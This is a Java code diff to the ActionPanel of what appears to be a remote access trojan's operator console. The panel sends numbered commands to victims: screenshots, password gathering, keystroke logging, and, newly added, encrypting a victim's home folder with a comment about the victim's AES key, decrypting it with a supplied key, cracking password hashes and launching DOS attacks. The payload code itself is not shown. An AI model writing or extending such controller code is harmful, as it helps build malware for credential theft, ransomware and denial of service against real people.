@@ -1,36 +1,34 @@
 package view;
+
 import java.awt.Color;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.io.BufferedReader;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
 import java.io.IOException;
-import java.io.InputStreamReader;
-import java.net.Socket;
-import java.net.UnknownHostException;
+import java.util.Scanner;
 
+import javax.swing.BoxLayout;
 import javax.swing.JButton;
+import javax.swing.JFileChooser;
 import javax.swing.JLabel;
 import javax.swing.JPanel;
 
-import model.ClientConnection;
-import model.ClientStatus;
 import model.Server;
 
 public class ActionPanel extends JPanel {
+
+  private static final long serialVersionUID = 8918020282892448008L;
   
+  // size of key for encrypting/decrypting victim's files in bytes
+  // (AES)
+  private static final int ENCRYPTED_FILE_KEY_SIZE = 32;
   private static final Color BACKGROUND_COLOR = Color.WHITE;
-  private ClientConnection cc;
-  
+
   public ActionPanel(final Server server) {
-    if (Math.random() == 2) {
-      try {
-        cc = new ClientConnection(ClientStatus.GREEN, server, new Socket("localhost", 5715));
-      } catch (UnknownHostException e) {
-        e.printStackTrace();
-      } catch (IOException e) {
-        e.printStackTrace();
-      }
-    }
+    setLayout(new BoxLayout(this, BoxLayout.Y_AXIS));
+
     setBackground(BACKGROUND_COLOR);
     JLabel title = new JLabel("Actions");
     JButton screenshot = new JButton("Take screenshot");
@@ -40,7 +38,7 @@ public class ActionPanel extends JPanel {
         server.sendCommand("143", null);
       }
     });   
-    
+
     JButton passwords = new JButton("Gather passwords");
     passwords.addMouseListener(new MouseAdapter() {
       @Override
@@ -48,27 +46,66 @@ public class ActionPanel extends JPanel {
         server.sendCommand("144", null);
       }
     });
-    
+
     JButton keylog = new JButton("Log keystrokes");
     keylog.addMouseListener(new MouseAdapter() {
       @Override
       public void mouseClicked(MouseEvent e) {
         server.sendCommand("145", null);
-//        try {
-//          BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
-//          server.receiveMessage(br.readLine(), cc);
-//        } catch (UnknownHostException e1) {
-//          e1.printStackTrace();
-//        } catch (IOException e1) {
-//          e1.printStackTrace();
-//        }
       }
     });
-    
+
+    JButton encrypt = new JButton("Encrypt home folder");
+    encrypt.addMouseListener(new MouseAdapter() {
+      @Override
+      public void mouseClicked(MouseEvent e) {
+        server.sendCommand("146", null);
+      }
+    });
+
+    JButton decrypt = new JButton("Decrypt home folder");
+    decrypt.addMouseListener(new MouseAdapter() {
+      @Override
+      public void mouseClicked(MouseEvent e) {
+
+        final JFileChooser fc = new JFileChooser();
+        fc.showOpenDialog(ActionPanel.this);
+
+        char[] bytes = new char[ENCRYPTED_FILE_KEY_SIZE];
+        try {
+          BufferedReader br = new BufferedReader(new FileReader(fc.getSelectedFile()));
+          br.read(bytes, 0, ENCRYPTED_FILE_KEY_SIZE);
+          br.close();
+        } catch (IOException ioe) {
+          ioe.printStackTrace();
+        }
+        server.sendCommand("147", new String(bytes));
+      }
+    });
+
+    JButton hash = new JButton("Crack password hash");
+    hash.addMouseListener(new MouseAdapter() {
+      @Override
+      public void mouseClicked(MouseEvent e) {
+        server.sendCommand("148", null);
+      }
+    });
+
+    JButton dos = new JButton("DOS");
+    dos.addMouseListener(new MouseAdapter() {
+      @Override
+      public void mouseClicked(MouseEvent e) {
+        server.sendCommand("149", null);
+      }
+    });
+
     add(title);
     add(screenshot);
     add(passwords);
     add(keylog);
+    add(encrypt);
+    add(decrypt);
+    add(hash);
+    add(dos);
   }
-
 }
